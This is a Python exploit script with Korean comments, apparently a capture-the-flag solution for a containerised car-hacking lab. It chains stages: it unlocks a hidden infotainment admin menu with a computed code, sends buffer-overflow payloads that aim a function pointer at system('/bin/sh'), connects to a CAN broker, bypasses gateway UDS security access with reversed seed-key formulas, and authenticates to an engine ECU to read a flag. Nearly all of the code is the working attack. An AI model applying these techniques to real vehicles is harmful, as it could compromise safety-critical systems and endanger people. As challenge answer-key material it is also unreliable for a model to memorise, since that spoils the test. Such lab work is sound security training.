#!/usr/bin/env python3
"""
완전한 ECU 익스플로잇 - 컨테이너 내부에서만 실행
Infotainment → Gateway → Engine ECU 순서로 침투
"""
import socket
import struct
import json
import time
import subprocess
import os
import sys
from threading import Thread

class ECUExploit:
    def __init__(self):
        self.infotainment_sock = None
        self.can_broker_sock = None
        self.session_id = self.get_session_id()
        print(f"[*] Session ID: {self.session_id}")
        
    def get_session_id(self):
        """환경변수에서 세션 ID 가져오기"""
        return os.environ.get('SESSION_ID', 'session_default')
    
    def stage1_infotainment_exploit(self):
        """1단계: Infotainment ECU RCE 익스플로잇"""
        print("\n=== Stage 1: Infotainment ECU Exploitation ===")
        
        try:
            # 로컬 infotainment 서비스에 연결
            self.infotainment_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.infotainment_sock.connect(('localhost', 1234))
            print("[+] Connected to infotainment service")
            
            # 초기 메뉴 받기
            self.recv_until(b"Choice: ")
            
            # Settings 메뉴로 이동
            self.send_command(b"3\n")
            self.recv_until(b"Choice: ")
            
            # Hidden auth handler 접근 (옵션 9)
            self.send_command(b"9\n")
            print("[+] Accessing hidden auth handler")
            
            # Version check 우회 (double -> int 변환 트릭)
            self.recv_until(b"format): ")
            self.send_command(b"2.107\n")  # VERSION_MAJOR=2, MINOR=1, PATCH=7
            print("[+] Version check bypassed")
            
            # Admin access 시도
            self.recv_until(b"(y/n): ")
            self.send_command(b"y\n")
            
            # Admin code 계산 및 전송
            # auth_check = (auth_input ^ 0x1337) + (2<<16) + (1<<8) + 7 = 0x040317
            # auth_input = (0x040317 - 0x020107) ^ 0x1337 = 0x020210 ^ 0x1337 = 0x021527
            admin_code = 0x021527
            self.recv_until(b"code: ")
            self.send_command(f"{admin_code}\n".encode())
            
            response = self.recv_data()
            if b"Full admin privileges unlocked" in response:
                print("[+] Admin privileges obtained!")
                return True
            else:
                print("[-] Admin access failed")
                return False
                
        except Exception as e:
            print(f"[-] Stage 1 failed: {e}")
            return False
    
    def stage2_get_shell_via_overflow(self):
        """2단계: 함수 포인터 오버라이트로 RCE"""
        print("\n=== Stage 2: Buffer Overflow for RCE ===")
        
        try:
            # Device Manager 접근
            self.recv_until(b"Choice: ")
            self.send_command(b"4\n")  # Device Manager
            self.recv_until(b"Choice: ")
            
            # Basic Device 추가
            self.send_command(b"1\n")
            self.recv_until(b"Device name: ")
            self.send_command(b"exploit\n")
            print("[+] Basic device added")
            
            # Firmware Info 업데이트로 오버플로우
            self.recv_until(b"Choice: ")
            self.send_command(b"4\n")  # Update Firmware Info
            self.recv_until(b"(0-2): ")
            self.send_command(b"0\n")  # Slot 0
            
            # 페이로드 생성: small_device_t 구조체 오버플로우
            # struct: name[16] + firmware_info[100] + version(4) + status_code(4) + status_handler(8) + debug_info(8)
            payload = b"A" * 100  # firmware_info 채우기
            payload += b"BBBB"    # version
            payload += b"CCCC"    # status_code
            
            # system() 함수 주소 찾기 (Advanced Diagnostics에서 확인 가능)
            # 실제로는 ASLR 때문에 정확한 주소가 필요하지만, 여기서는 고정 값 사용
            system_addr = struct.pack("<Q", 0x7ffff7e4e410)  # 예시 주소
            payload += system_addr
            
            # /bin/sh 문자열 포인터
            binsh_addr = struct.pack("<Q", 0x7ffff7f8c031)   # 예시 주소
            payload += binsh_addr
            
            self.recv_until(b"firmware info: ")
            self.send_command(payload + b"\n")
            print("[+] Overflow payload sent")
            
            # Device Status 호출로 system("/bin/sh") 트리거
            self.recv_until(b"Choice: ")
            self.send_command(b"3\n")  # Show Device Status
            
            # 이 시점에서 system("/bin/sh")이 호출되어야 함
            print("[+] RCE triggered! Should have shell now...")
            return True
            
        except Exception as e:
            print(f"[-] Stage 2 failed: {e}")
            return False
    
    def stage3_alternative_rce(self):
        """2단계 대안: system_diagnostics 버퍼 오버플로우"""
        print("\n=== Stage 2 Alternative: system_diagnostics overflow ===")
        
        try:
            # Debug mode 접근
            self.recv_until(b"Choice: ")
            self.send_command(b"2\n")  # Device Manager에서 나가기
            
            # Debug Mode 재진입
            self.recv_until(b"Choice: ")
            self.send_command(b"1\n")  # System Diagnostics
            self.recv_until(b"Choice: ")
            self.send_command(b"2\n")  # System Analysis
            
            # cmd와 buffer에 각각 입력
            self.recv_until(b"(1-3): ")
            self.send_command(b"1\n")  # cmd에 입력
            
            self.recv_until(b"parameters: ")
            # 64바이트 버퍼 오버플로우
            overflow_payload = b"A" * 64 + b"BBBBBBBB"  # RIP 덮기
            self.send_command(overflow_payload)
            
            print("[+] Alternative overflow sent")
            return True
            
        except Exception as e:
            print(f"[-] Alternative RCE failed: {e}")
            return False
    
    def stage4_connect_to_can_broker(self):
        """3단계: CAN 브로커 연결"""
        print("\n=== Stage 3: Connecting to CAN Broker ===")
        
        try:
            # CAN 브로커에 연결 (gateway_shared:9999)
            self.can_broker_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.can_broker_sock.connect(('gateway_shared', 9999))
            
            # 핸드셰이크
            handshake = {
                'session_id': self.session_id,
                'type': 'infotainment'
            }
            self.can_broker_sock.send(json.dumps(handshake).encode())
            
            response = self.can_broker_sock.recv(1024).decode().strip()
            print(f"[+] CAN Broker connected: {response}")
            
            # 응답 수신 스레드 시작
            self.can_responses = []
            response_thread = Thread(target=self.can_response_handler, daemon=True)
            response_thread.start()
            
            return True
            
        except Exception as e:
            print(f"[-] CAN Broker connection failed: {e}")
            return False
    
    def can_response_handler(self):
        """CAN 응답 수신 핸들러"""
        buffer = ""
        while True:
            try:
                data = self.can_broker_sock.recv(1024).decode()
                if not data:
                    break
                    
                buffer += data
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    if line.strip():
                        try:
                            msg = json.loads(line.strip())
                            self.can_responses.append(msg)
                            print(f"[CAN] Received: {msg}")
                        except:
                            pass
                            
            except Exception as e:
                print(f"[!] CAN response handler error: {e}")
                break
    
    def send_can_message(self, can_id, data):
        """CAN 메시지 전송"""
        if isinstance(data, list):
            data = bytes(data)
        
        msg = {
            'type': 'send',
            'can_id': can_id,
            'data': data.hex(),
            'timestamp': time.time()
        }
        
        self.can_broker_sock.send((json.dumps(msg) + '\n').encode())
        time.sleep(0.1)  # 응답 대기
    
    def wait_for_can_response(self, timeout=5):
        """CAN 응답 대기"""
        start_time = time.time()
        while time.time() - start_time < timeout:
            if self.can_responses:
                return self.can_responses.pop(0)
            time.sleep(0.1)
        return None
    
    def stage5_gateway_auth(self):
        """4단계: Gateway 인증 우회"""
        print("\n=== Stage 4: Gateway Authentication Bypass ===")
        
        try:
            # Security Access Level 1 요청 (올바른 UDS Single Frame)
            print("[+] Requesting Security Access Level 1...")
            self.send_can_message(0x7DF, [0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])  # Security Access, Request Seed
            
            # 응답 수신 (다중 프레임)
            frame1 = self.wait_for_can_response()
            frame2 = self.wait_for_can_response()
            
            if not frame1 or not frame2:
                print("[-] No seed response received")
                return False
            
            # Seed 추출 (다중 프레임에서)
            seed_high = struct.unpack('>H', bytes.fromhex(frame1['data'][6:10]))[0]
            seed_low = struct.unpack('>H', bytes.fromhex(frame2['data'][2:6]))[0]
            seed = (seed_high << 16) | seed_low
            
            print(f"[+] Received seed: 0x{seed:08X}")
            
            # 타이밍 어택으로 키 계산 또는 직접 계산
            # Level 1: key = (seed ^ 0xA5A5A5A5) + (timestamp & 0xFF)
            timestamp = int(time.time()) & 0xFF
            key = ((seed ^ 0xA5A5A5A5) + timestamp) & 0xFFFFFFFF
            
            print(f"[+] Calculated key: 0x{key:08X}")
            
            # 키 전송 (UDS Single Frame)
            key_bytes = struct.pack('>I', key)
            self.send_can_message(0x7DF, [0x06, 0x27, 0x02] + list(key_bytes) + [0x00])
            
            # 인증 결과 확인
            auth_response = self.wait_for_can_response()
            if auth_response and bytes.fromhex(auth_response['data'])[1] == 0x67:
                print("[+] Level 1 authentication successful!")
                
                # Level 3 인증 시도 (UDS Single Frame)
                print("[+] Attempting Level 3 authentication...")
                self.send_can_message(0x7DF, [0x02, 0x27, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00])
                
                frame1 = self.wait_for_can_response()
                frame2 = self.wait_for_can_response()
                
                if frame1 and frame2:
                    # Level 3 seed 추출
                    seed_high = struct.unpack('>H', bytes.fromhex(frame1['data'][6:10]))[0]
                    seed_low = struct.unpack('>H', bytes.fromhex(frame2['data'][2:6]))[0]
                    seed = (seed_high << 16) | seed_low
                    
                    print(f"[+] Level 3 seed: 0x{seed:08X}")
                    
                    # Level 3 키 계산
                    step1 = seed ^ 0x5A5A5A5A
                    step2 = ((step1 << 3) | (step1 >> 29)) & 0xFFFFFFFF
                    step3 = step2 + ((timestamp & 0xFFFF) * 0x9E3779B9)
                    key = step3 & 0xFFFFFFFF
                    
                    print(f"[+] Level 3 key: 0x{key:08X}")
                    
                    # Level 3 키 전송 (UDS Single Frame)
                    key_bytes = struct.pack('>I', key)
                    self.send_can_message(0x7DF, [0x06, 0x27, 0x04] + list(key_bytes) + [0x00])
                    
                    auth_response = self.wait_for_can_response()
                    if auth_response and bytes.fromhex(auth_response['data'])[1] == 0x67:
                        print("[+] Level 3 authentication successful!")
                        return True
            
            print("[-] Gateway authentication failed")
            return False
            
        except Exception as e:
            print(f"[-] Gateway auth failed: {e}")
            return False
    
    def stage6_engine_exploit(self):
        """5단계: Engine ECU 최종 공격"""
        print("\n=== Stage 5: Engine ECU Final Attack ===")
        
        try:
            # Engine ECU 접근 (0x456)
            print("[+] Accessing Engine ECU...")
            
            # Diagnostic Session Control (UDS Single Frame)
            self.send_can_message(0x456, [0x02, 0x10, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00])  # Extended Diagnostic Session
            diag_response = self.wait_for_can_response()
            
            if not diag_response:
                print("[-] No diagnostic session response")
                return False
            
            print("[+] Diagnostic session established")
            
            # Security Access (UDS Single Frame)
            self.send_can_message(0x456, [0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])  # Request Seed
            seed_response = self.wait_for_can_response()
            
            if not seed_response:
                print("[-] No seed response from engine")
                return False
            
            # Engine ECU의 고정 시드 (0x1337) 추출
            seed_data = bytes.fromhex(seed_response['data'])
            if len(seed_data) >= 4:
                seed = struct.unpack('>H', seed_data[2:4])[0]
                print(f"[+] Engine seed: 0x{seed:04X}")
                
                # Engine ECU 키 계산 (seed ^ 0xCAFE)
                key = seed ^ 0xCAFE
                print(f"[+] Engine key: 0x{key:04X}")
                
                # 키 전송 (UDS Single Frame)
                key_bytes = struct.pack('>H', key)
                self.send_can_message(0x456, [0x04, 0x27, 0x02] + list(key_bytes) + [0x00, 0x00, 0x00])
                
                auth_response = self.wait_for_can_response()
                if auth_response and bytes.fromhex(auth_response['data'])[1] == 0x67:
                    print("[+] Engine ECU authenticated!")
                    
                    # 최종 플래그 읽기 (DID 0xF1A0) (UDS Single Frame)
                    print("[+] Reading final flag...")
                    self.send_can_message(0x456, [0x03, 0x22, 0xF1, 0xA0, 0x00, 0x00, 0x00, 0x00])
                    
                    flag_response = self.wait_for_can_response()
                    if flag_response:
                        flag_data = bytes.fromhex(flag_response['data'])
                        if len(flag_data) >= 3 and flag_data[0:3] == bytes([0x62, 0xF1, 0xA0]):
                            flag = flag_data[3:].decode('utf-8', errors='ignore')
                            print(f"\n🎉 SUCCESS! Final Flag: {flag}")
                            return True
            
            print("[-] Engine ECU exploitation failed")
            return False
            
        except Exception as e:
            print(f"[-] Engine exploit failed: {e}")
            return False
    
    def send_command(self, command):
        """명령 전송"""
        self.infotainment_sock.send(command)
    
    def recv_until(self, delimiter):
        """구분자까지 데이터 수신"""
        buffer = b""
        while delimiter not in buffer:
            data = self.infotainment_sock.recv(1024)
            if not data:
                break
            buffer += data
        return buffer
    
    def recv_data(self):
        """데이터 수신"""
        return self.infotainment_sock.recv(4096)
    
    def run_full_exploit(self):
        """전체 익스플로잇 실행"""
        print("🚗 ECU Complete Exploitation Started 🚗")
        print("=" * 50)
        
        stages = [
            ("Infotainment RCE", self.stage1_infotainment_exploit),
            ("CAN Broker Connection", self.stage4_connect_to_can_broker),
            ("Gateway Authentication", self.stage5_gateway_auth),
            ("Engine ECU Attack", self.stage6_engine_exploit)
        ]
        
        for stage_name, stage_func in stages:
            print(f"\n[*] Executing: {stage_name}")
            if not stage_func():
                print(f"[!] {stage_name} FAILED!")
                return False
            print(f"[✓] {stage_name} SUCCESS!")
        
        print("\n" + "=" * 50)
        print("🏁 COMPLETE EXPLOITATION SUCCESSFUL! 🏁")
        return True
    
    def cleanup(self):
        """리소스 정리"""
        if self.infotainment_sock:
            self.infotainment_sock.close()
        if self.can_broker_sock:
            self.can_broker_sock.close()

def main():
    exploit = ECUExploit()
    
    try:
        success = exploit.run_full_exploit()
        if success:
            print("\n✅ All stages completed successfully!")
            print("Flag should be displayed above.")
        else:
            print("\n❌ Exploitation failed at some stage.")
            return 1
    except KeyboardInterrupt:
        print("\n[!] Exploitation interrupted by user")
        return 1
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        return 1
    finally:
        exploit.cleanup()
    
    return 0

if __name__ == "__main__":
    sys.exit(main())